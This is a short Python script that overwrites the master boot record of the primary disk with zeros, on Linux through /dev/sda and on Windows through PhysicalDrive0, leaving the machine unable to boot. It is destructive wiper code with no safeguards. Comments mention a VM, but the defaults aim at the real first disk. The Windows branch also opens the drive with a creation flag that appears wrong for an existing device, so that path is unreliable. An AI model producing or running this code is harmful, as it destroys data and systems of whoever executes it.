import os
import platform

def delete_mbr_linux(disk):
    with open(disk, 'wb') as f:
        f.write(b'\x00' * 512)
    print(f"MBR on {disk} deleted successfully.")

def delete_mbr_windows(disk):
    import ctypes
    GENERIC_WRITE = 0x40000000
    CREATE_NEW = 1

    handle = ctypes.windll.kernel32.CreateFileW(
        disk,
        GENERIC_WRITE,
        0,
        None,
        CREATE_NEW,
        0,
        None
    )

    if handle == -1:
        raise ctypes.WinError()

    written = ctypes.c_ulong(0)
    buffer = ctypes.create_string_buffer(b'\x00' * 512)
    
    ctypes.windll.kernel32.WriteFile(handle, buffer, 512, ctypes.byref(written), None)
    ctypes.windll.kernel32.CloseHandle(handle)
    print(f"MBR on {disk} deleted successfully.")

def main():
    if platform.system() == 'Linux':
        disk = '/dev/sda'  # Change this to the correct disk for your VM
        delete_mbr_linux(disk)
    elif platform.system() == 'Windows':
        disk = r'\\.\PhysicalDrive0'  # Change this to the correct disk for your VM
        delete_mbr_windows(disk)
    else:
        print("Unsupported operating system.")

if __name__ == "__main__":
    main()

